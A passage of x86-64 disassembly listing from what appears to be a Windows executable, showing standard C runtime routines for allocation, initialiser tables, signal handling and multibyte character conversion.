   140007930:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007935:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000793a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000793f:	57                   	push   %rdi
   140007940:	48 83 ec 20          	sub    $0x20,%rsp
   140007944:	49 8b e8             	mov    %r8,%rbp
   140007947:	48 8b da             	mov    %rdx,%rbx
   14000794a:	48 8b f1             	mov    %rcx,%rsi
   14000794d:	48 85 d2             	test   %rdx,%rdx
   140007950:	74 1d                	je     0x14000796f
   140007952:	33 d2                	xor    %edx,%edx
   140007954:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   140007958:	48 f7 f3             	div    %rbx
   14000795b:	49 3b c0             	cmp    %r8,%rax
   14000795e:	73 0f                	jae    0x14000796f
   140007960:	e8 8b d3 ff ff       	call   0x140004cf0
   140007965:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000796b:	33 c0                	xor    %eax,%eax
   14000796d:	eb 41                	jmp    0x1400079b0
   14000796f:	48 85 c9             	test   %rcx,%rcx
   140007972:	74 0a                	je     0x14000797e
   140007974:	e8 ff b9 ff ff       	call   0x140003378
   140007979:	48 8b f8             	mov    %rax,%rdi
   14000797c:	eb 02                	jmp    0x140007980
   14000797e:	33 ff                	xor    %edi,%edi
   140007980:	48 0f af dd          	imul   %rbp,%rbx
   140007984:	48 8b ce             	mov    %rsi,%rcx
   140007987:	48 8b d3             	mov    %rbx,%rdx
   14000798a:	e8 b1 cf ff ff       	call   0x140004940
   14000798f:	48 8b f0             	mov    %rax,%rsi
   140007992:	48 85 c0             	test   %rax,%rax
   140007995:	74 16                	je     0x1400079ad
   140007997:	48 3b fb             	cmp    %rbx,%rdi
   14000799a:	73 11                	jae    0x1400079ad
   14000799c:	48 2b df             	sub    %rdi,%rbx
   14000799f:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   1400079a3:	4c 8b c3             	mov    %rbx,%r8
   1400079a6:	33 d2                	xor    %edx,%edx
   1400079a8:	e8 13 ae ff ff       	call   0x1400027c0
   1400079ad:	48 8b c6             	mov    %rsi,%rax
   1400079b0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400079b5:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400079ba:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400079bf:	48 83 c4 20          	add    $0x20,%rsp
   1400079c3:	5f                   	pop    %rdi
   1400079c4:	c3                   	ret
   1400079c5:	90                   	nop
   1400079c6:	90                   	nop
   1400079c7:	90                   	nop
   1400079c8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400079cd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400079d2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400079d7:	57                   	push   %rdi
   1400079d8:	48 83 ec 20          	sub    $0x20,%rsp
   1400079dc:	48 8b f2             	mov    %rdx,%rsi
   1400079df:	48 8b f9             	mov    %rcx,%rdi
   1400079e2:	48 3b ca             	cmp    %rdx,%rcx
   1400079e5:	75 04                	jne    0x1400079eb
   1400079e7:	b0 01                	mov    $0x1,%al
   1400079e9:	eb 5c                	jmp    0x140007a47
   1400079eb:	48 8b d9             	mov    %rcx,%rbx
   1400079ee:	48 8b 2b             	mov    (%rbx),%rbp
   1400079f1:	48 85 ed             	test   %rbp,%rbp
   1400079f4:	74 0f                	je     0x140007a05
   1400079f6:	48 8b cd             	mov    %rbp,%rcx
   1400079f9:	ff 15 89 48 00 00    	call   *0x4889(%rip)        # 0x14000c288
   1400079ff:	ff d5                	call   *%rbp
   140007a01:	84 c0                	test   %al,%al
   140007a03:	74 09                	je     0x140007a0e
   140007a05:	48 83 c3 10          	add    $0x10,%rbx
   140007a09:	48 3b de             	cmp    %rsi,%rbx
   140007a0c:	75 e0                	jne    0x1400079ee
   140007a0e:	48 3b de             	cmp    %rsi,%rbx
   140007a11:	74 d4                	je     0x1400079e7
   140007a13:	48 3b df             	cmp    %rdi,%rbx
   140007a16:	74 2d                	je     0x140007a45
   140007a18:	48 83 c3 f8          	add    $0xfffffffffffffff8,%rbx
   140007a1c:	48 83 7b f8 00       	cmpq   $0x0,-0x8(%rbx)
   140007a21:	74 15                	je     0x140007a38
   140007a23:	48 8b 33             	mov    (%rbx),%rsi
   140007a26:	48 85 f6             	test   %rsi,%rsi
   140007a29:	74 0d                	je     0x140007a38
   140007a2b:	48 8b ce             	mov    %rsi,%rcx
   140007a2e:	ff 15 54 48 00 00    	call   *0x4854(%rip)        # 0x14000c288
   140007a34:	33 c9                	xor    %ecx,%ecx
   140007a36:	ff d6                	call   *%rsi
   140007a38:	48 83 eb 10          	sub    $0x10,%rbx
   140007a3c:	48 8d 43 08          	lea    0x8(%rbx),%rax
   140007a40:	48 3b c7             	cmp    %rdi,%rax
   140007a43:	75 d7                	jne    0x140007a1c
   140007a45:	32 c0                	xor    %al,%al
   140007a47:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007a4c:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140007a51:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007a56:	48 83 c4 20          	add    $0x20,%rsp
   140007a5a:	5f                   	pop    %rdi
   140007a5b:	c3                   	ret
   140007a5c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007a61:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007a66:	57                   	push   %rdi
   140007a67:	48 83 ec 20          	sub    $0x20,%rsp
   140007a6b:	48 8b f1             	mov    %rcx,%rsi
   140007a6e:	48 3b ca             	cmp    %rdx,%rcx
   140007a71:	74 26                	je     0x140007a99
   140007a73:	48 8d 5a f8          	lea    -0x8(%rdx),%rbx
   140007a77:	48 8b 3b             	mov    (%rbx),%rdi
   140007a7a:	48 85 ff             	test   %rdi,%rdi
   140007a7d:	74 0d                	je     0x140007a8c
   140007a7f:	48 8b cf             	mov    %rdi,%rcx
   140007a82:	ff 15 00 48 00 00    	call   *0x4800(%rip)        # 0x14000c288
   140007a88:	33 c9                	xor    %ecx,%ecx
   140007a8a:	ff d7                	call   *%rdi
   140007a8c:	48 83 eb 10          	sub    $0x10,%rbx
   140007a90:	48 8d 43 08          	lea    0x8(%rbx),%rax
   140007a94:	48 3b c6             	cmp    %rsi,%rax
   140007a97:	75 de                	jne    0x140007a77
   140007a99:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007a9e:	b0 01                	mov    $0x1,%al
   140007aa0:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007aa5:	48 83 c4 20          	add    $0x20,%rsp
   140007aa9:	5f                   	pop    %rdi
   140007aaa:	c3                   	ret
   140007aab:	90                   	nop
   140007aac:	48 89 0d 75 ef 00 00 	mov    %rcx,0xef75(%rip)        # 0x140016a28
   140007ab3:	c3                   	ret
   140007ab4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007ab9:	57                   	push   %rdi
   140007aba:	48 83 ec 20          	sub    $0x20,%rsp
   140007abe:	48 8b f9             	mov    %rcx,%rdi
   140007ac1:	e8 2e 00 00 00       	call   0x140007af4
   140007ac6:	48 8b d8             	mov    %rax,%rbx
   140007ac9:	48 85 c0             	test   %rax,%rax
   140007acc:	74 19                	je     0x140007ae7
   140007ace:	48 8b c8             	mov    %rax,%rcx
   140007ad1:	ff 15 b1 47 00 00    	call   *0x47b1(%rip)        # 0x14000c288
   140007ad7:	48 8b cf             	mov    %rdi,%rcx
   140007ada:	ff d3                	call   *%rbx
   140007adc:	85 c0                	test   %eax,%eax
   140007ade:	74 07                	je     0x140007ae7
   140007ae0:	b8 01 00 00 00       	mov    $0x1,%eax
   140007ae5:	eb 02                	jmp    0x140007ae9
   140007ae7:	33 c0                	xor    %eax,%eax
   140007ae9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007aee:	48 83 c4 20          	add    $0x20,%rsp
   140007af2:	5f                   	pop    %rdi
   140007af3:	c3                   	ret
   140007af4:	53                   	push   %rbx
   140007af5:	48 83 ec 20          	sub    $0x20,%rsp
   140007af9:	33 c9                	xor    %ecx,%ecx
   140007afb:	e8 7c e9 ff ff       	call   0x14000647c
   140007b00:	90                   	nop
   140007b01:	48 8b 1d 10 d5 00 00 	mov    0xd510(%rip),%rbx        # 0x140015018
   140007b08:	8b cb                	mov    %ebx,%ecx
   140007b0a:	83 e1 3f             	and    $0x3f,%ecx
   140007b0d:	48 33 1d 14 ef 00 00 	xor    0xef14(%rip),%rbx        # 0x140016a28
   140007b14:	48 d3 cb             	ror    %cl,%rbx
   140007b17:	33 c9                	xor    %ecx,%ecx
   140007b19:	e8 b2 e9 ff ff       	call   0x1400064d0
   140007b1e:	48 8b c3             	mov    %rbx,%rax
   140007b21:	48 83 c4 20          	add    $0x20,%rsp
   140007b25:	5b                   	pop    %rbx
   140007b26:	c3                   	ret
   140007b27:	90                   	nop
   140007b28:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007b2d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140007b32:	57                   	push   %rdi
   140007b33:	48 83 ec 20          	sub    $0x20,%rsp
   140007b37:	49 8b f9             	mov    %r9,%rdi
   140007b3a:	8b 0a                	mov    (%rdx),%ecx
   140007b3c:	e8 3b e9 ff ff       	call   0x14000647c
   140007b41:	90                   	nop
   140007b42:	48 8b 1d cf d4 00 00 	mov    0xd4cf(%rip),%rbx        # 0x140015018
   140007b49:	8b cb                	mov    %ebx,%ecx
   140007b4b:	83 e1 3f             	and    $0x3f,%ecx
   140007b4e:	48 33 1d eb ee 00 00 	xor    0xeeeb(%rip),%rbx        # 0x140016a40
   140007b55:	48 d3 cb             	ror    %cl,%rbx
   140007b58:	8b 0f                	mov    (%rdi),%ecx
   140007b5a:	e8 71 e9 ff ff       	call   0x1400064d0
   140007b5f:	48 8b c3             	mov    %rbx,%rax
   140007b62:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007b67:	48 83 c4 20          	add    $0x20,%rsp
   140007b6b:	5f                   	pop    %rdi
   140007b6c:	c3                   	ret
   140007b6d:	90                   	nop
   140007b6e:	90                   	nop
   140007b6f:	90                   	nop
   140007b70:	4c 8b dc             	mov    %rsp,%r11
   140007b73:	48 83 ec 28          	sub    $0x28,%rsp
   140007b77:	b8 03 00 00 00       	mov    $0x3,%eax
   140007b7c:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   140007b80:	4d 8d 43 08          	lea    0x8(%r11),%r8
   140007b84:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140007b88:	49 8d 53 18          	lea    0x18(%r11),%rdx
   140007b8c:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140007b90:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   140007b94:	e8 8f ff ff ff       	call   0x140007b28
   140007b99:	48 83 c4 28          	add    $0x28,%rsp
   140007b9d:	c3                   	ret
   140007b9e:	90                   	nop
   140007b9f:	90                   	nop
   140007ba0:	48 89 0d 89 ee 00 00 	mov    %rcx,0xee89(%rip)        # 0x140016a30
   140007ba7:	48 89 0d 8a ee 00 00 	mov    %rcx,0xee8a(%rip)        # 0x140016a38
   140007bae:	48 89 0d 8b ee 00 00 	mov    %rcx,0xee8b(%rip)        # 0x140016a40
   140007bb5:	48 89 0d 8c ee 00 00 	mov    %rcx,0xee8c(%rip)        # 0x140016a48
   140007bbc:	c3                   	ret
   140007bbd:	90                   	nop
   140007bbe:	90                   	nop
   140007bbf:	90                   	nop
   140007bc0:	48 8b c4             	mov    %rsp,%rax
   140007bc3:	53                   	push   %rbx
   140007bc4:	56                   	push   %rsi
   140007bc5:	57                   	push   %rdi
   140007bc6:	41 54                	push   %r12
   140007bc8:	41 55                	push   %r13
   140007bca:	41 57                	push   %r15
   140007bcc:	48 83 ec 48          	sub    $0x48,%rsp
   140007bd0:	8b f9                	mov    %ecx,%edi
   140007bd2:	45 33 ed             	xor    %r13d,%r13d
   140007bd5:	44 21 68 18          	and    %r13d,0x18(%rax)
   140007bd9:	40 b6 01             	mov    $0x1,%sil
   140007bdc:	40 88 b4 24 80 00 00 	mov    %sil,0x80(%rsp)
   140007be3:	00 
   140007be4:	83 f9 02             	cmp    $0x2,%ecx
   140007be7:	0f 84 8e 00 00 00    	je     0x140007c7b
   140007bed:	83 f9 04             	cmp    $0x4,%ecx
   140007bf0:	74 22                	je     0x140007c14
   140007bf2:	83 f9 06             	cmp    $0x6,%ecx
   140007bf5:	0f 84 80 00 00 00    	je     0x140007c7b
   140007bfb:	83 f9 08             	cmp    $0x8,%ecx
   140007bfe:	74 14                	je     0x140007c14
   140007c00:	83 f9 0b             	cmp    $0xb,%ecx
   140007c03:	74 0f                	je     0x140007c14
   140007c05:	83 f9 0f             	cmp    $0xf,%ecx
   140007c08:	74 71                	je     0x140007c7b
   140007c0a:	8d 41 eb             	lea    -0x15(%rcx),%eax
   140007c0d:	83 f8 01             	cmp    $0x1,%eax
   140007c10:	76 69                	jbe    0x140007c7b
   140007c12:	eb 44                	jmp    0x140007c58
   140007c14:	e8 2b d5 ff ff       	call   0x140005144
   140007c19:	4c 8b e8             	mov    %rax,%r13
   140007c1c:	48 85 c0             	test   %rax,%rax
   140007c1f:	75 08                	jne    0x140007c29
   140007c21:	83 c8 ff             	or     $0xffffffff,%eax
   140007c24:	e9 22 02 00 00       	jmp    0x140007e4b
   140007c29:	48 8b 08             	mov    (%rax),%rcx
   140007c2c:	48 8b 15 1d 4a 00 00 	mov    0x4a1d(%rip),%rdx        # 0x14000c650
   140007c33:	48 c1 e2 04          	shl    $0x4,%rdx
   140007c37:	48 03 d1             	add    %rcx,%rdx
   140007c3a:	eb 09                	jmp    0x140007c45
   140007c3c:	39 79 04             	cmp    %edi,0x4(%rcx)
   140007c3f:	74 0b                	je     0x140007c4c
   140007c41:	48 83 c1 10          	add    $0x10,%rcx
   140007c45:	48 3b ca             	cmp    %rdx,%rcx
   140007c48:	75 f2                	jne    0x140007c3c
   140007c4a:	33 c9                	xor    %ecx,%ecx
   140007c4c:	33 c0                	xor    %eax,%eax
   140007c4e:	48 85 c9             	test   %rcx,%rcx
   140007c51:	0f 95 c0             	setne  %al
   140007c54:	85 c0                	test   %eax,%eax
   140007c56:	75 12                	jne    0x140007c6a
   140007c58:	e8 93 d0 ff ff       	call   0x140004cf0
   140007c5d:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140007c63:	e8 68 cf ff ff       	call   0x140004bd0
   140007c68:	eb b7                	jmp    0x140007c21
   140007c6a:	48 8d 59 08          	lea    0x8(%rcx),%rbx
   140007c6e:	40 32 f6             	xor    %sil,%sil
   140007c71:	40 88 b4 24 80 00 00 	mov    %sil,0x80(%rsp)
   140007c78:	00 
   140007c79:	eb 3f                	jmp    0x140007cba
   140007c7b:	83 e9 02             	sub    $0x2,%ecx
   140007c7e:	74 33                	je     0x140007cb3
   140007c80:	83 e9 04             	sub    $0x4,%ecx
   140007c83:	74 13                	je     0x140007c98
   140007c85:	83 e9 09             	sub    $0x9,%ecx
   140007c88:	74 20                	je     0x140007caa
   140007c8a:	83 e9 06             	sub    $0x6,%ecx
   140007c8d:	74 12                	je     0x140007ca1
   140007c8f:	83 f9 01             	cmp    $0x1,%ecx
   140007c92:	74 04                	je     0x140007c98
   140007c94:	33 db                	xor    %ebx,%ebx
   140007c96:	eb 22                	jmp    0x140007cba
   140007c98:	48 8d 1d a1 ed 00 00 	lea    0xeda1(%rip),%rbx        # 0x140016a40
   140007c9f:	eb 19                	jmp    0x140007cba
   140007ca1:	48 8d 1d 90 ed 00 00 	lea    0xed90(%rip),%rbx        # 0x140016a38
   140007ca8:	eb 10                	jmp    0x140007cba
   140007caa:	48 8d 1d 97 ed 00 00 	lea    0xed97(%rip),%rbx        # 0x140016a48
   140007cb1:	eb 07                	jmp    0x140007cba
   140007cb3:	48 8d 1d 76 ed 00 00 	lea    0xed76(%rip),%rbx        # 0x140016a30
   140007cba:	48 83 a4 24 98 00 00 	andq   $0x0,0x98(%rsp)
   140007cc1:	00 00 
   140007cc3:	40 84 f6             	test   %sil,%sil
   140007cc6:	74 0b                	je     0x140007cd3
   140007cc8:	b9 03 00 00 00       	mov    $0x3,%ecx
   140007ccd:	e8 aa e7 ff ff       	call   0x14000647c
   140007cd2:	90                   	nop
   140007cd3:	40 84 f6             	test   %sil,%sil
   140007cd6:	74 17                	je     0x140007cef
   140007cd8:	48 8b 15 39 d3 00 00 	mov    0xd339(%rip),%rdx        # 0x140015018
   140007cdf:	8b ca                	mov    %edx,%ecx
   140007ce1:	83 e1 3f             	and    $0x3f,%ecx
   140007ce4:	48 33 13             	xor    (%rbx),%rdx
   140007ce7:	48 d3 ca             	ror    %cl,%rdx
   140007cea:	4c 8b fa             	mov    %rdx,%r15
   140007ced:	eb 03                	jmp    0x140007cf2
   140007cef:	4c 8b 3b             	mov    (%rbx),%r15
   140007cf2:	49 83 ff 01          	cmp    $0x1,%r15
   140007cf6:	0f 94 c0             	sete   %al
   140007cf9:	88 84 24 88 00 00 00 	mov    %al,0x88(%rsp)
   140007d00:	84 c0                	test   %al,%al
   140007d02:	0f 85 bf 00 00 00    	jne    0x140007dc7
   140007d08:	4d 85 ff             	test   %r15,%r15
   140007d0b:	75 18                	jne    0x140007d25
   140007d0d:	40 84 f6             	test   %sil,%sil
   140007d10:	74 09                	je     0x140007d1b
   140007d12:	41 8d 4f 03          	lea    0x3(%r15),%ecx
   140007d16:	e8 b5 e7 ff ff       	call   0x1400064d0
   140007d1b:	b9 03 00 00 00       	mov    $0x3,%ecx
   140007d20:	e8 0f c2 ff ff       	call   0x140003f34
   140007d25:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   140007d2b:	83 ff 0b             	cmp    $0xb,%edi
   140007d2e:	77 40                	ja     0x140007d70
   140007d30:	41 0f a3 fc          	bt     %edi,%r12d
   140007d34:	73 3a                	jae    0x140007d70
   140007d36:	49 8b 45 08          	mov    0x8(%r13),%rax
   140007d3a:	48 89 84 24 98 00 00 	mov    %rax,0x98(%rsp)
   140007d41:	00 
   140007d42:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140007d47:	49 83 65 08 00       	andq   $0x0,0x8(%r13)
   140007d4c:	83 ff 08             	cmp    $0x8,%edi
   140007d4f:	75 56                	jne    0x140007da7
   140007d51:	e8 5a d3 ff ff       	call   0x1400050b0
   140007d56:	8b 40 10             	mov    0x10(%rax),%eax
   140007d59:	89 84 24 90 00 00 00 	mov    %eax,0x90(%rsp)
   140007d60:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140007d64:	e8 47 d3 ff ff       	call   0x1400050b0
   140007d69:	c7 40 10 8c 00 00 00 	movl   $0x8c,0x10(%rax)
   140007d70:	83 ff 08             	cmp    $0x8,%edi
   140007d73:	75 32                	jne    0x140007da7
   140007d75:	48 8b 05 dc 48 00 00 	mov    0x48dc(%rip),%rax        # 0x14000c658
   140007d7c:	48 c1 e0 04          	shl    $0x4,%rax
   140007d80:	49 03 45 00          	add    0x0(%r13),%rax
   140007d84:	48 8b 0d d5 48 00 00 	mov    0x48d5(%rip),%rcx        # 0x14000c660
   140007d8b:	48 c1 e1 04          	shl    $0x4,%rcx
   140007d8f:	48 03 c8             	add    %rax,%rcx
   140007d92:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140007d97:	48 3b c1             	cmp    %rcx,%rax
   140007d9a:	74 31                	je     0x140007dcd
   140007d9c:	48 83 60 08 00       	andq   $0x0,0x8(%rax)
   140007da1:	48 83 c0 10          	add    $0x10,%rax
   140007da5:	eb eb                	jmp    0x140007d92
   140007da7:	48 8b 15 6a d2 00 00 	mov    0xd26a(%rip),%rdx        # 0x140015018
   140007dae:	8b c2                	mov    %edx,%eax
   140007db0:	83 e0 3f             	and    $0x3f,%eax
   140007db3:	b9 40 00 00 00       	mov    $0x40,%ecx
   140007db8:	2b c8                	sub    %eax,%ecx
   140007dba:	33 c0                	xor    %eax,%eax
   140007dbc:	48 d3 c8             	ror    %cl,%rax
   140007dbf:	48 33 c2             	xor    %rdx,%rax
   140007dc2:	48 89 03             	mov    %rax,(%rbx)
   140007dc5:	eb 06                	jmp    0x140007dcd
   140007dc7:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   140007dcd:	40 84 f6             	test   %sil,%sil
   140007dd0:	74 0a                	je     0x140007ddc
   140007dd2:	b9 03 00 00 00       	mov    $0x3,%ecx
   140007dd7:	e8 f4 e6 ff ff       	call   0x1400064d0
   140007ddc:	80 bc 24 88 00 00 00 	cmpb   $0x0,0x88(%rsp)
   140007de3:	00 
   140007de4:	74 04                	je     0x140007dea
   140007de6:	33 c0                	xor    %eax,%eax
   140007de8:	eb 61                	jmp    0x140007e4b
   140007dea:	83 ff 08             	cmp    $0x8,%edi
   140007ded:	75 1e                	jne    0x140007e0d
   140007def:	e8 bc d2 ff ff       	call   0x1400050b0
   140007df4:	48 8b d8             	mov    %rax,%rbx
   140007df7:	49 8b cf             	mov    %r15,%rcx
   140007dfa:	48 8b 15 87 44 00 00 	mov    0x4487(%rip),%rdx        # 0x14000c288
   140007e01:	ff d2                	call   *%rdx
   140007e03:	8b 53 10             	mov    0x10(%rbx),%edx
   140007e06:	8b cf                	mov    %edi,%ecx
   140007e08:	41 ff d7             	call   *%r15
   140007e0b:	eb 11                	jmp    0x140007e1e
   140007e0d:	49 8b cf             	mov    %r15,%rcx
   140007e10:	48 8b 05 71 44 00 00 	mov    0x4471(%rip),%rax        # 0x14000c288
   140007e17:	ff d0                	call   *%rax
   140007e19:	8b cf                	mov    %edi,%ecx
   140007e1b:	41 ff d7             	call   *%r15
   140007e1e:	83 ff 0b             	cmp    $0xb,%edi
   140007e21:	77 c3                	ja     0x140007de6
   140007e23:	41 0f a3 fc          	bt     %edi,%r12d
   140007e27:	73 bd                	jae    0x140007de6
   140007e29:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
   140007e30:	00 
   140007e31:	49 89 45 08          	mov    %rax,0x8(%r13)
   140007e35:	83 ff 08             	cmp    $0x8,%edi
   140007e38:	75 ac                	jne    0x140007de6
   140007e3a:	e8 71 d2 ff ff       	call   0x1400050b0
   140007e3f:	8b 8c 24 90 00 00 00 	mov    0x90(%rsp),%ecx
   140007e46:	89 48 10             	mov    %ecx,0x10(%rax)
   140007e49:	eb 9b                	jmp    0x140007de6
   140007e4b:	48 83 c4 48          	add    $0x48,%rsp
   140007e4f:	41 5f                	pop    %r15
   140007e51:	41 5d                	pop    %r13
   140007e53:	41 5c                	pop    %r12
   140007e55:	5f                   	pop    %rdi
   140007e56:	5e                   	pop    %rsi
   140007e57:	5b                   	pop    %rbx
   140007e58:	c3                   	ret
   140007e59:	90                   	nop
   140007e5a:	90                   	nop
   140007e5b:	90                   	nop
   140007e5c:	48 8b c4             	mov    %rsp,%rax
   140007e5f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007e63:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140007e67:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140007e6b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140007e6f:	41 56                	push   %r14
   140007e71:	48 83 ec 50          	sub    $0x50,%rsp
   140007e75:	45 33 f6             	xor    %r14d,%r14d
   140007e78:	49 8b e8             	mov    %r8,%rbp
   140007e7b:	48 8b f2             	mov    %rdx,%rsi
   140007e7e:	48 8b f9             	mov    %rcx,%rdi
   140007e81:	48 85 d2             	test   %rdx,%rdx
   140007e84:	74 13                	je     0x140007e99
   140007e86:	4d 85 c0             	test   %r8,%r8
   140007e89:	74 0e                	je     0x140007e99
   140007e8b:	44 38 32             	cmp    %r14b,(%rdx)
   140007e8e:	75 26                	jne    0x140007eb6
   140007e90:	48 85 c9             	test   %rcx,%rcx
   140007e93:	74 04                	je     0x140007e99
   140007e95:	66 44 89 31          	mov    %r14w,(%rcx)
   140007e99:	33 c0                	xor    %eax,%eax
   140007e9b:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140007ea0:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140007ea5:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140007eaa:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140007eaf:	48 83 c4 50          	add    $0x50,%rsp
   140007eb3:	41 5e                	pop    %r14
   140007eb5:	c3                   	ret
   140007eb6:	49 8b d1             	mov    %r9,%rdx
   140007eb9:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140007ebe:	e8 ed c9 ff ff       	call   0x1400048b0
   140007ec3:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140007ec8:	4c 39 b0 38 01 00 00 	cmp    %r14,0x138(%rax)
   140007ecf:	75 15                	jne    0x140007ee6
   140007ed1:	48 85 ff             	test   %rdi,%rdi
   140007ed4:	74 06                	je     0x140007edc
   140007ed6:	0f b6 06             	movzbl (%rsi),%eax
   140007ed9:	66 89 07             	mov    %ax,(%rdi)
   140007edc:	bb 01 00 00 00       	mov    $0x1,%ebx
   140007ee1:	e9 a4 00 00 00       	jmp    0x140007f8a
   140007ee6:	0f b6 0e             	movzbl (%rsi),%ecx
   140007ee9:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140007eee:	e8 11 10 00 00       	call   0x140008f04
   140007ef3:	bb 01 00 00 00       	mov    $0x1,%ebx
   140007ef8:	85 c0                	test   %eax,%eax
   140007efa:	74 51                	je     0x140007f4d
   140007efc:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140007f01:	44 8b 49 08          	mov    0x8(%rcx),%r9d
   140007f05:	44 3b cb             	cmp    %ebx,%r9d
   140007f08:	7e 2f                	jle    0x140007f39
   140007f0a:	41 3b e9             	cmp    %r9d,%ebp
   140007f0d:	7c 2a                	jl     0x140007f39
   140007f0f:	8b 49 0c             	mov    0xc(%rcx),%ecx
   140007f12:	8d 53 08             	lea    0x8(%rbx),%edx
   140007f15:	41 8b c6             	mov    %r14d,%eax
   140007f18:	48 85 ff             	test   %rdi,%rdi
   140007f1b:	4c 8b c6             	mov    %rsi,%r8
   140007f1e:	0f 95 c0             	setne  %al
   140007f21:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140007f25:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140007f2a:	ff 15 48 42 00 00    	call   *0x4248(%rip)        # 0x14000c178
   140007f30:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140007f35:	85 c0                	test   %eax,%eax
   140007f37:	75 0f                	jne    0x140007f48
   140007f39:	48 63 41 08          	movslq 0x8(%rcx),%rax
   140007f3d:	48 3b e8             	cmp    %rax,%rbp
   140007f40:	72 3a                	jb     0x140007f7c
   140007f42:	44 38 76 01          	cmp    %r14b,0x1(%rsi)
   140007f46:	74 34                	je     0x140007f7c
   140007f48:	8b 59 08             	mov    0x8(%rcx),%ebx
   140007f4b:	eb 3d                	jmp    0x140007f8a
   140007f4d:	41 8b c6             	mov    %r14d,%eax
   140007f50:	48 85 ff             	test   %rdi,%rdi
   140007f53:	44 8b cb             	mov    %ebx,%r9d
   140007f56:	4c 8b c6             	mov    %rsi,%r8
   140007f59:	0f 95 c0             	setne  %al
   140007f5c:	ba 09 00 00 00       	mov    $0x9,%edx
   140007f61:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140007f65:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140007f6a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140007f6f:	8b 48 0c             	mov    0xc(%rax),%ecx
   140007f72:	ff 15 00 42 00 00    	call   *0x4200(%rip)        # 0x14000c178
   140007f78:	85 c0                	test   %eax,%eax
   140007f7a:	75 0e                	jne    0x140007f8a
   140007f7c:	e8 6f cd ff ff       	call   0x140004cf0
   140007f81:	83 cb ff             	or     $0xffffffff,%ebx
   140007f84:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   140007f8a:	44 38 74 24 48       	cmp    %r14b,0x48(%rsp)
   140007f8f:	74 0c                	je     0x140007f9d
   140007f91:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140007f96:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   140007f9d:	8b c3                	mov    %ebx,%eax
   140007f9f:	e9 f7 fe ff ff       	jmp    0x140007e9b
   140007fa4:	45 33 c9             	xor    %r9d,%r9d
   140007fa7:	e9 b0 fe ff ff       	jmp    0x140007e5c
   140007fac:	53                   	push   %rbx
   140007fad:	48 83 ec 20          	sub    $0x20,%rsp
   140007fb1:	48 8b 05 60 ea 00 00 	mov    0xea60(%rip),%rax        # 0x140016a18
   140007fb8:	48 8b da             	mov    %rdx,%rbx
   140007fbb:	48 39 02             	cmp    %rax,(%rdx)
   140007fbe:	74 16                	je     0x140007fd6
   140007fc0:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140007fc6:	85 05 34 d8 00 00    	test   %eax,0xd834(%rip)        # 0x140015800
   140007fcc:	75 08                	jne    0x140007fd6
   140007fce:	e8 7d f8 ff ff       	call   0x140007850
   140007fd3:	48 89 03             	mov    %rax,(%rbx)
   140007fd6:	48 83 c4 20          	add    $0x20,%rsp
   140007fda:	5b                   	pop    %rbx
   140007fdb:	c3                   	ret
   140007fdc:	90                   	nop
   140007fdd:	90                   	nop
   140007fde:	90                   	nop
   140007fdf:	90                   	nop
   140007fe0:	53                   	push   %rbx
   140007fe1:	48 83 ec 20          	sub    $0x20,%rsp
   140007fe5:	48 8b 05 ec d2 00 00 	mov    0xd2ec(%rip),%rax        # 0x1400152d8
   140007fec:	48 8b da             	mov    %rdx,%rbx
